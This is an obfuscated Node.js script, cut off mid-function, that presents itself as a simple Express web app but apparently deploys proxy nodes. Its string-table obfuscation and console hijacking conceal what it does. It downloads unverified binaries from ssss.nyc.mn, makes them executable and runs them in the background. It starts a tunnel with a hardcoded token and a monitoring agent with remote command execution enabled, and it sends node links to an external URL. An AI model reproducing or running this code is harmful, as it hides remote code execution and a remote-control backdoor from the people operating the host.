const _0x2bdeaa=_0x22e1;(function(_0xe9104f,_0x5e6ed1){const _0x4ab2e6=_0x22e1,_0x22bff8=_0xe9104f();while(!![]){try{const _0x149845=-parseInt(_0x4ab2e6(0x236))/0x1*(parseInt(_0x4ab2e6(0x22c))/0x2)+parseInt(_0x4ab2e6(0x20b))/0x3*(parseInt(_0x4ab2e6(0x289))/0x4)+parseInt(_0x4ab2e6(0x24d))/0x5*(-parseInt(_0x4ab2e6(0x200))/0x6)+-parseInt(_0x4ab2e6(0x275))/0x7*(-parseInt(_0x4ab2e6(0x20a))/0x8)+-parseInt(_0x4ab2e6(0x27c))/0x9+parseInt(_0x4ab2e6(0x282))/0xa*(parseInt(_0x4ab2e6(0x28e))/0xb)+parseInt(_0x4ab2e6(0x1d0))/0xc;if(_0x149845===_0x5e6ed1)break;else _0x22bff8['push'](_0x22bff8['shift']());}catch(_0x150e3d){_0x22bff8['push'](_0x22bff8['shift']());}}}(_0x51e9,0x76b15));const _0xaeb5f8=(function(){let _0x578572=!![];return function(_0x2e9119,_0xea73f5){const _0x1c197e=_0x578572?function(){const _0x4b6353=_0x22e1;if(_0xea73f5){const _0x132cac=_0xea73f5[_0x4b6353(0x234)](_0x2e9119,arguments);return _0xea73f5=null,_0x132cac;}}:function(){};return _0x578572=![],_0x1c197e;};}()),_0x581a3d=_0xaeb5f8(this,function(){const _0x3cd7f3=_0x22e1;return _0x581a3d[_0x3cd7f3(0x1ef)]()[_0x3cd7f3(0x27d)](_0x3cd7f3(0x207))['toString']()[_0x3cd7f3(0x212)](_0x581a3d)['search'](_0x3cd7f3(0x207));});_0x581a3d();const _0x259960=(function(){let _0x253e3d=!![];return function(_0x271481,_0x289fce){const _0x5ec6c5=_0x253e3d?function(){const _0x1c6d68=_0x22e1;if(_0x289fce){const _0x50cb87=_0x289fce[_0x1c6d68(0x234)](_0x271481,arguments);return _0x289fce=null,_0x50cb87;}}:function(){};return _0x253e3d=![],_0x5ec6c5;};}()),_0x2fee84=_0x259960(this,function(){const _0x1d6dff=_0x22e1;let _0x1a9cf6;try{const _0xb33a5b=Function(_0x1d6dff(0x25f)+_0x1d6dff(0x290)+');');_0x1a9cf6=_0xb33a5b();}catch(_0x1fbecb){_0x1a9cf6=window;}const _0x361b4e=_0x1a9cf6[_0x1d6dff(0x285)]=_0x1a9cf6[_0x1d6dff(0x285)]||{},_0x77b911=[_0x1d6dff(0x255),_0x1d6dff(0x25b),_0x1d6dff(0x245),'error',_0x1d6dff(0x22d),_0x1d6dff(0x249),_0x1d6dff(0x22a)];for(let _0x1e4297=0x0;_0x1e4297<_0x77b911[_0x1d6dff(0x1e5)];_0x1e4297++){const _0x16a8ea=_0x259960[_0x1d6dff(0x212)][_0x1d6dff(0x1e7)][_0x1d6dff(0x262)](_0x259960),_0x4a791a=_0x77b911[_0x1e4297],_0x542e0b=_0x361b4e[_0x4a791a]||_0x16a8ea;_0x16a8ea[_0x1d6dff(0x269)]=_0x259960['bind'](_0x259960),_0x16a8ea[_0x1d6dff(0x1ef)]=_0x542e0b[_0x1d6dff(0x1ef)][_0x1d6dff(0x262)](_0x542e0b),_0x361b4e[_0x4a791a]=_0x16a8ea;}});_0x2fee84();const express=require(_0x2bdeaa(0x1df)),app=express(),axios=require(_0x2bdeaa(0x260)),os=require('os'),fs=require('fs'),path=require(_0x2bdeaa(0x24c)),{promisify}=require(_0x2bdeaa(0x23b)),exec=promisify(require(_0x2bdeaa(0x1e6))[_0x2bdeaa(0x1d8)]),UPLOAD_URL=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x221)]||'',PROJECT_URL=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x223)]||'',AUTO_ACCESS=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x238)]||![],FILE_PATH=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x1d2)]||_0x2bdeaa(0x24a),SUB_PATH=process[_0x2bdeaa(0x242)]['SUB_PATH']||'sub',PORT=process[_0x2bdeaa(0x242)]['SERVER_PORT']||process[_0x2bdeaa(0x242)]['PORT']||0xbb8,UUID=process['env'][_0x2bdeaa(0x251)]||_0x2bdeaa(0x1e2),NEZHA_SERVER=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x202)]||'',NEZHA_PORT=process['env'][_0x2bdeaa(0x27b)]||'',NEZHA_KEY=process[_0x2bdeaa(0x242)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x20c)]||_0x2bdeaa(0x233),ARGO_AUTH=process[_0x2bdeaa(0x242)]['ARGO_AUTH']||_0x2bdeaa(0x1c5),ARGO_PORT=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x271)]||0x1f41,CFIP=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x239)]||_0x2bdeaa(0x201),CFPORT=process[_0x2bdeaa(0x242)][_0x2bdeaa(0x222)]||0x1bb,NAME=process['env']['NAME']||_0x2bdeaa(0x1da);!fs['existsSync'](FILE_PATH)?(fs[_0x2bdeaa(0x1e0)](FILE_PATH),console[_0x2bdeaa(0x255)](FILE_PATH+'\x20is\x20created')):console[_0x2bdeaa(0x255)](FILE_PATH+_0x2bdeaa(0x286));function generateRandomName(){const _0x5a0dbd=_0x2bdeaa,_0x3e42fb=_0x5a0dbd(0x215);let _0x248c16='';for(let _0x5177db=0x0;_0x5177db<0x6;_0x5177db++){_0x248c16+=_0x3e42fb[_0x5a0dbd(0x292)](Math[_0x5a0dbd(0x270)](Math[_0x5a0dbd(0x1bf)]()*_0x3e42fb['length']));}return _0x248c16;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2bdeaa(0x263)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x2bdeaa(0x263)](FILE_PATH,webName),botPath=path[_0x2bdeaa(0x263)](FILE_PATH,botName),subPath=path[_0x2bdeaa(0x263)](FILE_PATH,_0x2bdeaa(0x21f)),listPath=path[_0x2bdeaa(0x263)](FILE_PATH,_0x2bdeaa(0x224)),bootLogPath=path['join'](FILE_PATH,_0x2bdeaa(0x241)),configPath=path[_0x2bdeaa(0x263)](FILE_PATH,'config.json');function deleteNodes(){const _0x593cbd=_0x2bdeaa;try{if(!UPLOAD_URL)return;if(!fs[_0x593cbd(0x28b)](subPath))return;let _0x2da1b8;try{_0x2da1b8=fs[_0x593cbd(0x20f)](subPath,_0x593cbd(0x24b));}catch{return null;}const _0x4898be=Buffer[_0x593cbd(0x27f)](_0x2da1b8,_0x593cbd(0x28c))['toString']('utf-8'),_0x3c9c8d=_0x4898be[_0x593cbd(0x1c4)]('\x0a')['filter'](_0x21709e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x593cbd(0x253)](_0x21709e));if(_0x3c9c8d['length']===0x0)return;return axios[_0x593cbd(0x23c)](UPLOAD_URL+_0x593cbd(0x21b),JSON[_0x593cbd(0x1eb)]({'nodes':_0x3c9c8d}),{'headers':{'Content-Type':'application/json'}})[_0x593cbd(0x1ff)](_0x40a919=>{return null;}),null;}catch(_0x2c9aca){return null;}}function cleanupOldFiles(){const _0x4ae8ba=_0x2bdeaa;try{const _0x17dd97=fs['readdirSync'](FILE_PATH);_0x17dd97[_0x4ae8ba(0x1f5)](_0x313ab7=>{const _0xe17684=_0x4ae8ba,_0xeaeed=path['join'](FILE_PATH,_0x313ab7);try{const _0x106544=fs[_0xe17684(0x266)](_0xeaeed);_0x106544[_0xe17684(0x26a)]()&&fs[_0xe17684(0x209)](_0xeaeed);}catch(_0x517d00){}});}catch(_0x207d54){}}async function generateConfig(){const _0x2c2bb0=_0x2bdeaa,_0x26bee4={'log':{'access':_0x2c2bb0(0x26f),'error':_0x2c2bb0(0x26f),'loglevel':_0x2c2bb0(0x252)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2c2bb0(0x272),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2c2bb0(0x252),'fallbacks':[{'dest':0xbb9},{'path':_0x2c2bb0(0x216),'dest':0xbba},{'path':_0x2c2bb0(0x1f1),'dest':0xbbb},{'path':_0x2c2bb0(0x1f0),'dest':0xbbc}]},'streamSettings':{'network':_0x2c2bb0(0x26e)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x2c2bb0(0x272),'settings':{'clients':[{'id':UUID}],'decryption':_0x2c2bb0(0x252)},'streamSettings':{'network':_0x2c2bb0(0x26e),'security':_0x2c2bb0(0x252)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2c2bb0(0x272),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2c2bb0(0x252),'wsSettings':{'path':_0x2c2bb0(0x216)}},'sniffing':{'enabled':!![],'destOverride':[_0x2c2bb0(0x205),_0x2c2bb0(0x1fc),_0x2c2bb0(0x213)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2c2bb0(0x25d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2c2bb0(0x1f1)}},'sniffing':{'enabled':!![],'destOverride':[_0x2c2bb0(0x205),_0x2c2bb0(0x1fc),_0x2c2bb0(0x213)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2c2bb0(0x25d),'protocol':_0x2c2bb0(0x1fa),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2c2bb0(0x252),'wsSettings':{'path':_0x2c2bb0(0x1f0)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2c2bb0(0x213)],'metadataOnly':![]}}],'dns':{'servers':[_0x2c2bb0(0x1d1)]},'outbounds':[{'protocol':_0x2c2bb0(0x1ca),'tag':_0x2c2bb0(0x1e4)},{'protocol':_0x2c2bb0(0x208),'tag':_0x2c2bb0(0x25e)}]};fs['writeFileSync'](path[_0x2c2bb0(0x263)](FILE_PATH,_0x2c2bb0(0x1db)),JSON[_0x2c2bb0(0x1eb)](_0x26bee4,null,0x2));}function getSystemArchitecture(){const _0x5e7ad5=_0x2bdeaa,_0x1f5c90=os['arch']();return _0x1f5c90==='arm'||_0x1f5c90===_0x5e7ad5(0x1ee)||_0x1f5c90==='aarch64'?_0x5e7ad5(0x235):_0x5e7ad5(0x28f);}function downloadFile(_0x4ab82c,_0x556ce2,_0x344e80){const _0xc1a913=_0x2bdeaa,_0x3a77cd=_0x4ab82c;!fs[_0xc1a913(0x28b)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5d8955=fs[_0xc1a913(0x22b)](_0x3a77cd);axios({'method':_0xc1a913(0x204),'url':_0x556ce2,'responseType':_0xc1a913(0x1c9)})[_0xc1a913(0x278)](_0x275598=>{const _0x51f4b4=_0xc1a913;_0x275598[_0x51f4b4(0x1de)]['pipe'](_0x5d8955),_0x5d8955['on'](_0x51f4b4(0x264),()=>{const _0x2f08c0=_0x51f4b4;_0x5d8955[_0x2f08c0(0x243)](),console[_0x2f08c0(0x255)](_0x2f08c0(0x1c8)+path[_0x2f08c0(0x1c1)](_0x3a77cd)+_0x2f08c0(0x1f6)),_0x344e80(null,_0x3a77cd);}),_0x5d8955['on']('error',_0x4d6919=>{const _0x37a30e=_0x51f4b4;fs['unlink'](_0x3a77cd,()=>{});const _0x2587fe=_0x37a30e(0x1c8)+path[_0x37a30e(0x1c1)](_0x3a77cd)+_0x37a30e(0x218)+_0x4d6919[_0x37a30e(0x1f8)];console[_0x37a30e(0x1e8)](_0x2587fe),_0x344e80(_0x2587fe);});})[_0xc1a913(0x1ff)](_0x446399=>{const _0x3ac9dd=_0xc1a913,_0x4c84b7=_0x3ac9dd(0x1c8)+path[_0x3ac9dd(0x1c1)](_0x3a77cd)+_0x3ac9dd(0x218)+_0x446399['message'];console[_0x3ac9dd(0x1e8)](_0x4c84b7),_0x344e80(_0x4c84b7);});}async function downloadFilesAndRun(){const _0x28d53e=_0x2bdeaa,_0x399eee=getSystemArchitecture(),_0x393c9e=getFilesForArchitecture(_0x399eee);if(_0x393c9e[_0x28d53e(0x1e5)]===0x0){console[_0x28d53e(0x255)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1a7d1a=_0x393c9e[_0x28d53e(0x1c6)](_0x4e72f7=>{return new Promise((_0x20d2df,_0x388633)=>{const _0x4ef657=_0x22e1;downloadFile(_0x4e72f7[_0x4ef657(0x1f4)],_0x4e72f7[_0x4ef657(0x1e3)],(_0x16c316,_0x30e1d4)=>{_0x16c316?_0x388633(_0x16c316):_0x20d2df(_0x30e1d4);});});});try{await Promise['all'](_0x1a7d1a);}catch(_0x539470){console[_0x28d53e(0x1e8)](_0x28d53e(0x280),_0x539470);return;}function _0x546e0e(_0x19b5ef){const _0x3cb9e9=_0x28d53e,_0x154159=0x1fd;_0x19b5ef[_0x3cb9e9(0x1f5)](_0x121f65=>{const _0x2cb9a3=_0x3cb9e9;fs[_0x2cb9a3(0x28b)](_0x121f65)&&fs['chmod'](_0x121f65,_0x154159,_0x26f6dc=>{const _0xf83450=_0x2cb9a3;_0x26f6dc?console['error'](_0xf83450(0x229)+_0x121f65+':\x20'+_0x26f6dc):console['log']('Empowerment\x20success\x20for\x20'+_0x121f65+':\x20'+_0x154159[_0xf83450(0x1ef)](0x8));});});}const _0x2f7e4e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x546e0e(_0x2f7e4e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4a95db=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x28d53e(0x1c4)](':')[_0x28d53e(0x1d5)]():'',_0x1ccaed=new Set(['443',_0x28d53e(0x1d6),'2096',_0x28d53e(0x279),_0x28d53e(0x1d4),_0x28d53e(0x287)]),_0x1afb66=_0x1ccaed[_0x28d53e(0x25a)](_0x4a95db)?_0x28d53e(0x1d9):'false',_0x34fc0a=_0x28d53e(0x246)+NEZHA_KEY+_0x28d53e(0x23e)+NEZHA_SERVER+_0x28d53e(0x1d3)+_0x1afb66+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x28d53e(0x277)](path[_0x28d53e(0x263)](FILE_PATH,_0x28d53e(0x26d)),_0x34fc0a);const _0x2472b1=_0x28d53e(0x20d)+phpPath+_0x28d53e(0x206)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2472b1),console[_0x28d53e(0x255)](phpName+_0x28d53e(0x1ec)),await new Promise(_0x115cd5=>setTimeout(_0x115cd5,0x3e8));}catch(_0x559a0a){console['error']('php\x20running\x20error:\x20'+_0x559a0a);}}else{let _0x34fda3='';const _0x2c048c=['443',_0x28d53e(0x1d6),_0x28d53e(0x268),_0x28d53e(0x279),_0x28d53e(0x1d4),_0x28d53e(0x287)];_0x2c048c['includes'](NEZHA_PORT)&&(_0x34fda3=_0x28d53e(0x226));const _0x54794a=_0x28d53e(0x20d)+npmPath+_0x28d53e(0x203)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x34fda3+_0x28d53e(0x261);try{await exec(_0x54794a),console[_0x28d53e(0x255)](npmName+_0x28d53e(0x1ec)),await new Promise(_0x361046=>setTimeout(_0x361046,0x3e8));}catch(_0x38dcce){console[_0x28d53e(0x1e8)](_0x28d53e(0x1dd)+_0x38dcce);}}}else console[_0x28d53e(0x255)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x47c6d5='nohup\x20'+webPath+_0x28d53e(0x254)+FILE_PATH+_0x28d53e(0x1cb);try{await exec(_0x47c6d5),console['log'](webName+_0x28d53e(0x1ec)),await new Promise(_0x345b25=>setTimeout(_0x345b25,0x3e8));}catch(_0x4a4010){console[_0x28d53e(0x1e8)](_0x28d53e(0x220)+_0x4a4010);}if(fs[_0x28d53e(0x28b)](botPath)){let _0x493d92;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x493d92=_0x28d53e(0x265)+ARGO_AUTH;else ARGO_AUTH[_0x28d53e(0x24e)](/TunnelSecret/)?_0x493d92=_0x28d53e(0x244)+FILE_PATH+_0x28d53e(0x1dc):_0x493d92='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x28d53e(0x1cc)+ARGO_PORT;try{await exec(_0x28d53e(0x20d)+botPath+'\x20'+_0x493d92+_0x28d53e(0x1e9)),console[_0x28d53e(0x255)](botName+_0x28d53e(0x1ec)),await new Promise(_0x463396=>setTimeout(_0x463396,0x7d0));}catch(_0x47e8a7){console[_0x28d53e(0x1e8)](_0x28d53e(0x258)+_0x47e8a7);}}await new Promise(_0x23139b=>setTimeout(_0x23139b,0x1388));}function getFilesForArchitecture(_0x4a8999){const _0x41f5e8=_0x2bdeaa;let _0x5817d1;_0x4a8999===_0x41f5e8(0x235)?_0x5817d1=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x41f5e8(0x21e)}]:_0x5817d1=[{'fileName':webPath,'fileUrl':_0x41f5e8(0x1f2)},{'fileName':botPath,'fileUrl':_0x41f5e8(0x214)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xe4f6f9=_0x4a8999===_0x41f5e8(0x235)?_0x41f5e8(0x1f7):_0x41f5e8(0x22e);_0x5817d1[_0x41f5e8(0x1c2)]({'fileName':npmPath,'fileUrl':_0xe4f6f9});}else{const _0x4542eb=_0x4a8999===_0x41f5e8(0x235)?_0x41f5e8(0x219):'https://amd64.ssss.nyc.mn/v1';_0x5817d1[_0x41f5e8(0x1c2)]({'fileName':phpPath,'fileUrl':_0x4542eb});}}return _0x5817d1;}function argoType(){const _0x30b5e2=_0x2bdeaa;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x30b5e2(0x255)](_0x30b5e2(0x211));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x30b5e2(0x277)](path[_0x30b5e2(0x263)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4439ad=_0x30b5e2(0x225)+ARGO_AUTH[_0x30b5e2(0x1c4)]('\x22')[0xb]+_0x30b5e2(0x284)+path[_0x30b5e2(0x263)](FILE_PATH,'tunnel.json')+_0x30b5e2(0x1d7)+ARGO_DOMAIN+_0x30b5e2(0x231)+ARGO_PORT+_0x30b5e2(0x273);fs['writeFileSync'](path[_0x30b5e2(0x263)](FILE_PATH,_0x30b5e2(0x247)),_0x4439ad);}else console[_0x30b5e2(0x255)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}function _0x22e1(_0xfa5244,_0x368237){_0xfa5244=_0xfa5244-0x1bf;const _0x4b0998=_0x51e9();let _0x2fee84=_0x4b0998[_0xfa5244];return _0x2fee84;}async function extractDomains(){const _0x55496a=_0x2bdeaa;let _0x1c0613;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c0613=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x1c0613),await _0x248641(_0x1c0613);else try{const _0x4cc671=fs['readFileSync'](path['join'](FILE_PATH,_0x55496a(0x241)),'utf-8'),_0x32c047=_0x4cc671[_0x55496a(0x1c4)]('\x0a'),_0x49d33b=[];_0x32c047[_0x55496a(0x1f5)](_0x475d8e=>{const _0x547c88=_0x55496a,_0x4a317b=_0x475d8e[_0x547c88(0x24e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4a317b){const _0x45ca93=_0x4a317b[0x1];_0x49d33b[_0x547c88(0x267)](_0x45ca93);}});if(_0x49d33b['length']>0x0)_0x1c0613=_0x49d33b[0x0],console[_0x55496a(0x255)](_0x55496a(0x237),_0x1c0613),await _0x248641(_0x1c0613);else{console[_0x55496a(0x255)](_0x55496a(0x259)),fs[_0x55496a(0x209)](path[_0x55496a(0x263)](FILE_PATH,_0x55496a(0x241)));async function _0x517ab1(){const _0x141e5f=_0x55496a;try{process[_0x141e5f(0x291)]===_0x141e5f(0x288)?await exec(_0x141e5f(0x1ed)+botName+_0x141e5f(0x257)):await exec(_0x141e5f(0x1fb)+botName[_0x141e5f(0x292)](0x0)+']'+botName[_0x141e5f(0x1cd)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x23eb99){}}_0x517ab1(),await new Promise(_0x3146bb=>setTimeout(_0x3146bb,0xbb8));const _0x5ea937=_0x55496a(0x25c)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x55496a(0x20d)+botPath+'\x20'+_0x5ea937+_0x55496a(0x1e9)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x4fdb8b=>setTimeout(_0x4fdb8b,0xbb8)),await extractDomains();}catch(_0x551ef3){console[_0x55496a(0x1e8)]('Error\x20executing\x20command:\x20'+_0x551ef3);}}}catch(_0x2809dd){console[_0x55496a(0x1e8)](_0x55496a(0x1fe),_0x2809dd);}async function _0x30f702(){const _0xab36b3=_0x55496a;try{const _0x3e64a1=await axios[_0xab36b3(0x204)](_0xab36b3(0x217),{'timeout':0xbb8});if(_0x3e64a1[_0xab36b3(0x1de)]&&_0x3e64a1[_0xab36b3(0x1de)]['country_code']&&_0x3e64a1[_0xab36b3(0x1de)]['org'])return _0x3e64a1[_0xab36b3(0x1de)][_0xab36b3(0x1f3)]+'_'+_0x3e64a1[_0xab36b3(0x1de)][_0xab36b3(0x228)];}catch(_0x162acf){try{const _0x743b7d=await axios[_0xab36b3(0x204)](_0xab36b3(0x21c),{'timeout':0xbb8});if(_0x743b7d[_0xab36b3(0x1de)]&&_0x743b7d[_0xab36b3(0x1de)][_0xab36b3(0x248)]===_0xab36b3(0x28d)&&_0x743b7d[_0xab36b3(0x1de)]['countryCode']&&_0x743b7d[_0xab36b3(0x1de)][_0xab36b3(0x228)])return _0x743b7d['data'][_0xab36b3(0x227)]+'_'+_0x743b7d[_0xab36b3(0x1de)]['org'];}catch(_0xc7fa76){}}return'Unknown';}async function _0x248641(_0x3622b6){const _0x5f51df=await _0x30f702(),_0x11cccc=NAME?NAME+'-'+_0x5f51df:_0x5f51df;return new Promise(_0x7e8780=>{setTimeout(()=>{const _0xcde52=_0x22e1,_0x39fcd7={'v':'2','ps':''+_0x11cccc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xcde52(0x252),'net':'ws','type':_0xcde52(0x252),'host':_0x3622b6,'path':_0xcde52(0x210),'tls':_0xcde52(0x1fc),'sni':_0x3622b6,'alpn':'','fp':_0xcde52(0x230)},_0x8c1f4b='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0xcde52(0x27e)+_0x3622b6+_0xcde52(0x1ea)+_0x3622b6+_0xcde52(0x1c7)+_0x11cccc+'\x0a\x0avmess://'+Buffer[_0xcde52(0x27f)](JSON[_0xcde52(0x1eb)](_0x39fcd7))[_0xcde52(0x1ef)](_0xcde52(0x28c))+_0xcde52(0x1c0)+UUID+'@'+CFIP+':'+CFPORT+_0xcde52(0x27a)+_0x3622b6+_0xcde52(0x1ea)+_0x3622b6+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x11cccc+_0xcde52(0x1ce);console[_0xcde52(0x255)](Buffer['from'](_0x8c1f4b)['toString'](_0xcde52(0x28c))),fs[_0xcde52(0x277)](subPath,Buffer[_0xcde52(0x27f)](_0x8c1f4b)[_0xcde52(0x1ef)](_0xcde52(0x28c))),console['log'](FILE_PATH+_0xcde52(0x22f)),uploadNodes(),app[_0xcde52(0x204)]('/'+SUB_PATH,(_0xca7306,_0x9609a8)=>{const _0x5e6c17=_0xcde52,_0x141068=Buffer[_0x5e6c17(0x27f)](_0x8c1f4b)['toString']('base64');_0x9609a8['set'](_0x5e6c17(0x1f9),_0x5e6c17(0x21d)),_0x9609a8[_0x5e6c17(0x276)](_0x141068);}),_0x7e8780(_0x8c1f4b);},0x7d0);});}}function _0x51e9(){const _0x570071=['unlinkSync','8eKPKgS','2359065Trraam','ARGO_DOMAIN','nohup\x20','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','readFileSync','/vmess-argo?ed=2560','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','constructor','quic','https://amd64.ssss.nyc.mn/bot','abcdefghijklmnopqrstuvwxyz','/vless-argo','https://ipapi.co/json','\x20failed:\x20','https://arm64.ssss.nyc.mn/v1','Nodes\x20uploaded\x20successfully','/api/delete-nodes','http://ip-api.com/json','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/bot','sub.txt','web\x20running\x20error:\x20','UPLOAD_URL','CFPORT','PROJECT_URL','list.txt','\x0a\x20\x20tunnel:\x20','--tls','countryCode','org','Empowerment\x20failed\x20for\x20','trace','createWriteStream','307794IzYdYf','exception','https://amd64.ssss.nyc.mn/agent','/sub.txt\x20saved\x20successfully','firefox','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/api/add-subscriptions','galaxya.qwen.ddns-ip.net','apply','arm','5LLdYtV','ArgoDomain:','AUTO_ACCESS','CFIP','clear','util','post','Skipping\x20adding\x20automatic\x20access\x20task','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','index.html','boot.log','env','close','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','info','\x0aclient_secret:\x20','tunnel.yml','status','table','.tmp','utf-8','path','65HqNGnH','match','utf8','Subscription\x20uploaded\x20successfully','UUID','none','test','\x20-c\x20','log','application/json','.exe\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','has','warn','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','127.0.0.1','block','return\x20(function()\x20','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','bind','join','finish','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','statSync','push','2096','__proto__','isFile','https://oooo.serv00.net/add-url','App\x20is\x20running','config.yaml','tcp','/dev/null','floor','ARGO_PORT','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','response','2001902LWTXds','send','writeFileSync','then','2087','?security=tls&sni=','NEZHA_PORT','1012914PaRhkf','search','?encryption=none&security=tls&sni=','from','Error\x20downloading\x20files:','listen','84790obZCYi','promises','\x0a\x20\x20credentials-file:\x20','console','\x20already\x20exists','2053','win32','4mfDkec','del\x20/f\x20/q\x20','existsSync','base64','success','319IsSSgf','amd','{}.constructor(\x22return\x20this\x22)(\x20)','platform','charAt','random','\x0a\x0atrojan://','basename','unshift','/api/add-nodes','split','eyJhIjoiODg3ZDQ2ZWMyM2ZmMDE0OGM3ZjBhNWI1NTI0OGYzMzQiLCJ0IjoiYzZjNzc0MzctZTEyNy00MTg1LWFmMDgtN2UwZTU0NWMwNjM4IiwicyI6Ik5HRTRaVEZoWkRVdE5XTTROUzAwTm1Zd0xUZ3pPVEl0TURGak9XTXdOVFppWmpJMiJ9','map','&path=%2Fvless-argo%3Fed%3D2560#','Download\x20','stream','freedom','/config.json\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','substring','\x0a\x20\x20\x20\x20','automatic\x20access\x20task\x20added\x20successfully','779124bHWZbQ','https+local://8.8.8.8/dns-query','FILE_PATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2083','pop','8443','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','exec','true','Galaxy','config.json','/tunnel.yml\x20run','npm\x20running\x20error:\x20','data','express','mkdirSync','\x20>\x20nul\x202>&1','3f3f4ab0-d887-4876-9180-c2e62e31f79f','fileUrl','direct','length','child_process','prototype','error','\x20>/dev/null\x202>&1\x20&','&fp=firefox&type=ws&host=','stringify','\x20is\x20running','taskkill\x20/f\x20/im\x20','arm64','toString','/trojan-argo','/vmess-argo','https://amd64.ssss.nyc.mn/web','country_code','fileName','forEach','\x20successfully','https://arm64.ssss.nyc.mn/agent','message','Content-Type','trojan','pkill\x20-f\x20\x22[','tls','rm\x20-rf\x20','Error\x20reading\x20boot.log:','catch','6906FhhiDo','cdns.doon.eu.org','NEZHA_SERVER','\x20-s\x20','get','http','\x20-c\x20\x22','(((.+)+)+)+$','blackhole'];_0x51e9=function(){return _0x570071;};return _0x51e9();}async function uploadNodes(){const _0x51185c=_0x2bdeaa;if(UPLOAD_URL&&PROJECT_URL){const _0x3ef9b4=PROJECT_URL+'/'+SUB_PATH,_0x5d2709={'subscription':[_0x3ef9b4]};try{const _0x4db563=await 